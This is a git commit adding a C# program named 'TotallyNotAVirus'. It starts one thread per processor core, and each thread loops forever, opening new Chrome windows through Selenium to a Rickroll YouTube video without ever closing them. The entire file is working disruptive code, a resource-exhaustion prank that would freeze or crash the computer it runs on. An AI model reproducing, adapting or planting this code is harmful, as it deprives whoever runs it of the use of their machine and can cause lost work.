0abda499356cc73be60eab51b9e0730147362dc6
miimoller <bhaktarohan20@gmail.com>
2024-02-06 14:20:08 -0800

    Add project files.

---
+++ TotallyNotAVirus/Program.cs
@@ -0,0 +1,29 @@
+﻿using OpenQA.Selenium;
+using OpenQA.Selenium.Chrome;
+using System;
+
+int totalCores = Environment.ProcessorCount;
+
+for(int i=0; i < totalCores; i++)
+{
+    new Thread(new ThreadStart(loopForever)).Start();
+}
+
+
+static void loopForever()
+{
+    while (true)
+    {
+        runOnce();
+    }
+}
+
+static void runOnce()
+{
+    ChromeOptions chromeOptions = new ChromeOptions();
+
+    IWebDriver driver = new ChromeDriver(chromeOptions);
+    driver.Navigate().GoToUrl("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+    driver.FindElement(By.XPath("/html/body/ytd-app/div[1]/ytd-page-manager/ytd-watch-flexy/div[5]/div[1]/div/div[1]/div[2]/div/div/ytd-player/div/div")).Click();
+}
+
